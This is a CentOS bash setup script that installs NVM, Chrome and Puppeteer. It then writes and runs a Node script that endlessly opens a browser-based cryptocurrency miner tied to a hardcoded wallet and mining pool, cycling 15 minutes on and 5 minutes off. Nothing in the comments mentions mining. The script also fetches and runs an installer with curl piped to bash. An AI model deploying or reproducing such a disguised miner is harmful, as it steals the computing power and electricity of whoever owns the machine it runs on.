#!/bin/bash

# Update CentOS system
sudo yum update -y

# Install NVM (Node Version Manager)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash

# Source .bashrc to enable NVM
source ~/.bashrc

# Install Node.js version 18 using NVM
nvm install 18

# Install dependencies required for Chrome, Puppeteer, and npx
sudo yum install -y \
  gconf-service \
  libXcomposite \
  libXcursor \
  libXi \
  libXtst \
  libXrandr \
  libXScrnSaver \
  alsa-lib \
  mesa-libEGL \
  libXdamage \
  mesa-libGL \
  libXss \
  libxshmfence \
  pango \
  atk \
  cups-libs \
  gtk3 \
  nss \
  xorg-x11-fonts-100dpi \
  xorg-x11-fonts-75dpi \
  xorg-x11-utils \
  xorg-x11-fonts-cyrillic \
  xorg-x11-fonts-Type1 \
  xorg-x11-fonts-misc \
  libappindicator-gtk3 \
  libappindicator-gtk2 \
  libdbusmenu \
  dbus-x11 \
  xorg-x11-server-Xvfb \
  xorg-x11-fonts-ISO8859-1-100dpi \
  xorg-x11-fonts-ISO8859-1-75dpi \
  xorg-x11-fonts-ISO8859-1 \
  xorg-x11-fonts-misc \
  ipa-gothic-fonts \
  ipa-mincho-fonts \
  wqy-zenhei-fonts \
  adobe-source-han-sans-cn-fonts \
  adobe-source-han-sans-tw-fonts \
  adobe-source-han-serif-cn-fonts \
  adobe-source-han-serif-tw-fonts \
  liberation-sans-fonts \
  liberation-serif-fonts \
  liberation-mono-fonts

# Install Google Chrome
sudo curl -o /etc/yum.repos.d/google-chrome.repo https://dl.google.com/linux/chrome/rpm/stable/x86_64/google-chrome.repo
sudo yum install -y google-chrome-stable

# Install Puppeteer and npx globally
npm install -g puppeteer npx

# Use npx to install compatible Chrome for Puppeteer
npx puppeteer browsers install

# Create and run Puppeteer script
cat <<EOF > puppeteer_script.js
const puppeteer = require('puppeteer');

(async () => {
  let browser;
  while (true) {
    try {
      browser = await puppeteer.launch({ headless: true });
      const page = await browser.newPage();
      await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
      
      const runPeriod = async (durationMs) => {
        console.log('Browser started.');
        await new Promise(resolve => setTimeout(resolve, durationMs));
        console.log('Browser stopped.');
        await browser.close();
      };

      const activePeriod = 15 * 60 * 1000; // 15 minutes in milliseconds
      const restPeriod = 5 * 60 * 1000;   // 5 minutes in milliseconds

      await runPeriod(activePeriod);
      await new Promise(resolve => setTimeout(resolve, restPeriod));
    } catch (error) {
      console.error('Error occurred:', error);
      if (browser) await browser.close();
    }
  }
})();
EOF

# Run Puppeteer script using Node.js
node puppeteer_script.js

# Optionally remove Puppeteer script after completion
# rm puppeteer_script.js
